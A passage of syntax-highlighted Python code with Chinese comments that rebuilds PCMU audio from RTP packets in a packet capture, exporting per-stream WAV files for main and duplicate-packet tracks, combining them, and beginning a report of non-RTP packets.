</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] 流 </span><span class="si">{</span><span class="n">srcp</span><span class="si">}</span><span class="s2">-&gt;</span><span class="si">{</span><span class="n">dstp</span><span class="si">}</span><span class="s2"> (SSRC=</span><span class="si">{</span><span class="n">ssrc</span><span class="si">}</span><span class="s2">) 包数 </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">pkts</span><span class="p">)</span><span class="si">}</span><span class="s2">，常见负载 </span><span class="si">{</span><span class="n">default_pl_size</span><span class="si">}</span><span class="s2">B&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 主音轨（丢弃重复包）</span>
</span></span><span class="line"><span class="cl">        <span class="n">main_buf</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">();</span> <span class="n">last_seq_main</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 重复音轨（仅由重复包构成，不丢弃重复）</span>
</span></span><span class="line"><span class="cl">        <span class="n">dup_buf</span>  <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">();</span>  <span class="n">last_seq_dup</span>  <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">pkts</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">seq</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="s2">&#34;seq&#34;</span><span class="p">];</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="s2">&#34;payload&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># ---------- 主音轨：保持原逻辑（丢弃重复包） ----------</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">last_seq_main</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">last_seq_main</span> <span class="o">=</span> <span class="n">seq</span>
</span></span><span class="line"><span class="cl">                <span class="n">main_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">seq</span> <span class="o">==</span> <span class="n">last_seq_main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># 重复包：主音轨丢弃</span>
</span></span><span class="line"><span class="cl">                    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">exp</span> <span class="o">=</span> <span class="p">(</span><span class="n">last_seq_main</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">seq</span> <span class="o">==</span> <span class="n">exp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">main_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="n">last_seq_main</span> <span class="o">=</span> <span class="n">seq</span>
</span></span><span class="line"><span class="cl">                    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">gap</span> <span class="o">=</span> <span class="p">(</span><span class="n">seq</span> <span class="o">-</span> <span class="n">exp</span> <span class="o">+</span> <span class="mi">65536</span><span class="p">)</span> <span class="o">%</span> <span class="mi">65536</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">gap</span> <span class="o">&lt;</span> <span class="n">MAX_GAP_PACKETS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">main_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">PCMU_SILENCE_BYTE</span> <span class="o">*</span> <span class="n">default_pl_size</span> <span class="o">*</span> <span class="n">gap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            <span class="n">main_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            <span class="n">last_seq_main</span> <span class="o">=</span> <span class="n">seq</span>
</span></span><span class="line"><span class="cl">                        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="c1"># 大跳变：直接衔接</span>
</span></span><span class="line"><span class="cl">                            <span class="n">main_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            <span class="n">last_seq_main</span> <span class="o">=</span> <span class="n">seq</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># ---------- 重复音轨：只收集“重复包内容” ----------</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 规则：当检测到 seq 与“主音轨 last_seq_main 之前值”相同，说明这是重复包；</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 但为避免主/重复交叉状态的问题，我们基于当前包与“上一主包序号”的相等性来定义“重复”：</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 如果与上一主包序号相等（即刚才进入主逻辑时被视作重复），则纳入重复音轨。</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 为实现这一点，我们在进入本循环顶部就先保存一下主轨 last_seq_main_before。</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 简化处理：当主逻辑认定此包为重复（seq == old_last_main），我们就把它写入 dup_buf。</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 这里通过再次判断实现：</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># （注意：主轨部分已经把 last_seq_main 更新/保持住了）</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 第二轮再走一遍，标注重复（避免在一次循环里被主轨状态更新影响判定）</span>
</span></span><span class="line"><span class="cl">        <span class="n">last_seq_main</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">pkts</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">seq</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="s2">&#34;seq&#34;</span><span class="p">];</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="s2">&#34;payload&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">last_seq_main</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">last_seq_main</span> <span class="o">=</span> <span class="n">seq</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">seq</span> <span class="o">==</span> <span class="n">last_seq_main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># 命中“重复包” -&gt; 写入重复音轨，并做简单的缺口补偿（相对 dup 序列）</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">last_seq_dup</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">last_seq_dup</span> <span class="o">=</span> <span class="n">seq</span>
</span></span><span class="line"><span class="cl">                    <span class="n">dup_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># 处理重复音轨的“序列缺口”以保证播放连贯（可选）</span>
</span></span><span class="line"><span class="cl">                    <span class="n">exp_dup</span> <span class="o">=</span> <span class="p">(</span><span class="n">last_seq_dup</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">seq</span> <span class="o">==</span> <span class="n">exp_dup</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">dup_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="n">last_seq_dup</span> <span class="o">=</span> <span class="n">seq</span>
</span></span><span class="line"><span class="cl">                    <span class="k">elif</span> <span class="n">seq</span> <span class="o">==</span> <span class="n">last_seq_dup</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="c1"># 同一序列的多次重复：直接追加</span>
</span></span><span class="line"><span class="cl">                        <span class="n">dup_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="c1"># last_seq_dup 不变也行；为稳定可设为相同值</span>
</span></span><span class="line"><span class="cl">                        <span class="n">last_seq_dup</span> <span class="o">=</span> <span class="n">seq</span>
</span></span><span class="line"><span class="cl">                    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">gap_dup</span> <span class="o">=</span> <span class="p">(</span><span class="n">seq</span> <span class="o">-</span> <span class="n">exp_dup</span> <span class="o">+</span> <span class="mi">65536</span><span class="p">)</span> <span class="o">%</span> <span class="mi">65536</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">gap_dup</span> <span class="o">&lt;</span> <span class="n">MAX_GAP_PACKETS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">dup_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">PCMU_SILENCE_BYTE</span> <span class="o">*</span> <span class="n">default_pl_size</span> <span class="o">*</span> <span class="n">gap_dup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            <span class="n">dup_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            <span class="n">last_seq_dup</span> <span class="o">=</span> <span class="n">seq</span>
</span></span><span class="line"><span class="cl">                        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">dup_buf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            <span class="n">last_seq_dup</span> <span class="o">=</span> <span class="n">seq</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">last_seq_main</span> <span class="o">=</span> <span class="n">seq</span>  <span class="c1"># 推进主轨参考序号</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># --- 解码 &amp; 处理：主音轨 ---</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload_main</span> <span class="o">=</span> <span class="n">main_buf</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">payload_main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pcm_main</span> <span class="o">=</span> <span class="n">decode_mulaw</span><span class="p">(</span><span class="n">payload_main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pcm_main</span> <span class="o">=</span> <span class="n">apply_gain</span><span class="p">(</span><span class="n">pcm_main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pcm_main</span> <span class="o">=</span> <span class="n">remove_silence</span><span class="p">(</span><span class="n">pcm_main</span><span class="p">,</span> <span class="n">sr</span><span class="o">=</span><span class="n">SAMPLE_RATE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pcm_main</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([],</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">wav_main</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">OUT_DIR</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;rtp_</span><span class="si">{</span><span class="n">srcp</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">dstp</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">ssrc</span><span class="si">}</span><span class="s2">.wav&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">save_wav</span><span class="p">(</span><span class="n">wav_main</span><span class="p">,</span> <span class="n">pcm_main</span><span class="p">,</span> <span class="n">SAMPLE_RATE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">out_files_main</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">wav_main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">per_stream_main</span><span class="o">.</span><span class="n">append</span><span class="p">(((</span><span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">,</span> <span class="n">ssrc</span><span class="p">),</span> <span class="n">pcm_main</span><span class="p">,</span> <span class="n">wav_main</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  [+] 主轨导出：</span><span class="si">{</span><span class="n">wav_main</span><span class="si">}</span><span class="s2">（</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">pcm_main</span><span class="p">)</span><span class="o">/</span><span class="n">SAMPLE_RATE</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">s）&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># --- 解码 &amp; 处理：重复音轨 ---</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload_dup</span> <span class="o">=</span> <span class="n">dup_buf</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">payload_dup</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pcm_dup</span> <span class="o">=</span> <span class="n">decode_mulaw</span><span class="p">(</span><span class="n">payload_dup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pcm_dup</span> <span class="o">=</span> <span class="n">apply_gain</span><span class="p">(</span><span class="n">pcm_dup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pcm_dup</span> <span class="o">=</span> <span class="n">remove_silence</span><span class="p">(</span><span class="n">pcm_dup</span><span class="p">,</span> <span class="n">sr</span><span class="o">=</span><span class="n">SAMPLE_RATE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pcm_dup</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([],</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">wav_dup</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">DUP_DIR</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;rtp_dup_</span><span class="si">{</span><span class="n">srcp</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">dstp</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">ssrc</span><span class="si">}</span><span class="s2">.wav&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">save_wav</span><span class="p">(</span><span class="n">wav_dup</span><span class="p">,</span> <span class="n">pcm_dup</span><span class="p">,</span> <span class="n">SAMPLE_RATE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">out_files_dup</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">wav_dup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">per_stream_dup</span><span class="o">.</span><span class="n">append</span><span class="p">(((</span><span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">,</span> <span class="n">ssrc</span><span class="p">),</span> <span class="n">pcm_dup</span><span class="p">,</span> <span class="n">wav_dup</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  [=] 重复轨导出：</span><span class="si">{</span><span class="n">wav_dup</span><span class="si">}</span><span class="s2">（</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">pcm_dup</span><span class="p">)</span><span class="o">/</span><span class="n">SAMPLE_RATE</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">s）&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">完成：主轨 </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">out_files_main</span><span class="p">)</span><span class="si">}</span><span class="s2"> 条，重复轨 </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">out_files_dup</span><span class="p">)</span><span class="si">}</span><span class="s2"> 条。&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ======== 合成总音频（主轨） ========</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">per_stream_main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">per_stream_main</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="p">(</span><span class="n">item</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">item</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">item</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="n">gap</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">SAMPLE_RATE</span> <span class="o">*</span> <span class="n">GAP_SECONDS</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">parts</span><span class="p">,</span> <span class="n">names</span> <span class="o">=</span> <span class="p">[],</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">,</span> <span class="n">ssrc</span><span class="p">),</span> <span class="n">pcm</span><span class="p">,</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">per_stream_main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">pcm</span><span class="o">.</span><span class="n">size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pcm</span><span class="p">);</span> <span class="n">names</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">path</span><span class="p">));</span> <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">gap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">parts</span> <span class="ow">and</span> <span class="n">parts</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">size</span> <span class="o">==</span> <span class="n">gap</span><span class="o">.</span><span class="n">size</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">parts</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">combined</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">concatenate</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="k">if</span> <span class="n">parts</span> <span class="k">else</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([],</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">comb_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">OUT_DIR</span><span class="p">,</span> <span class="n">COMBINED_MAIN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">save_wav</span><span class="p">(</span><span class="n">comb_path</span><span class="p">,</span> <span class="n">combined</span><span class="p">,</span> <span class="n">SAMPLE_RATE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[主轨合成] </span><span class="si">{</span><span class="n">comb_path</span><span class="si">}</span><span class="s2">  (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">combined</span><span class="p">)</span><span class="o">/</span><span class="n">SAMPLE_RATE</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">s)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">names</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;  顺序：&#34;</span><span class="p">);</span> <span class="p">[</span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;   - </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">names</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[主轨合成] 无可用音频，跳过。&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ======== 合成总音频（重复轨） ========</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">per_stream_dup</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">per_stream_dup</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="p">(</span><span class="n">item</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">item</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">item</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="n">gap</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">SAMPLE_RATE</span> <span class="o">*</span> <span class="n">GAP_SECONDS</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">parts</span><span class="p">,</span> <span class="n">names</span> <span class="o">=</span> <span class="p">[],</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">,</span> <span class="n">ssrc</span><span class="p">),</span> <span class="n">pcm</span><span class="p">,</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">per_stream_dup</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">pcm</span><span class="o">.</span><span class="n">size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pcm</span><span class="p">);</span> <span class="n">names</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">path</span><span class="p">));</span> <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">gap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">parts</span> <span class="ow">and</span> <span class="n">parts</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">size</span> <span class="o">==</span> <span class="n">gap</span><span class="o">.</span><span class="n">size</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">parts</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">combined</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">concatenate</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="k">if</span> <span class="n">parts</span> <span class="k">else</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([],</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">comb_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">DUP_DIR</span><span class="p">,</span> <span class="n">COMBINED_DUP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">save_wav</span><span class="p">(</span><span class="n">comb_path</span><span class="p">,</span> <span class="n">combined</span><span class="p">,</span> <span class="n">SAMPLE_RATE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[重复轨合成] </span><span class="si">{</span><span class="n">comb_path</span><span class="si">}</span><span class="s2">  (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">combined</span><span class="p">)</span><span class="o">/</span><span class="n">SAMPLE_RATE</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">s)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">names</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;  顺序：&#34;</span><span class="p">);</span> <span class="p">[</span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;   - </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">names</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[重复轨合成] 无可用音频，跳过。&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ======== 生成排查报告 ========</span>
</span></span><span class="line"><span class="cl">    <span class="n">report</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;# 非RTP/非PCMU 报告&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;生成时间: </span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;PCAP文件: </span><span class="si">{</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">PCAP_PATH</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
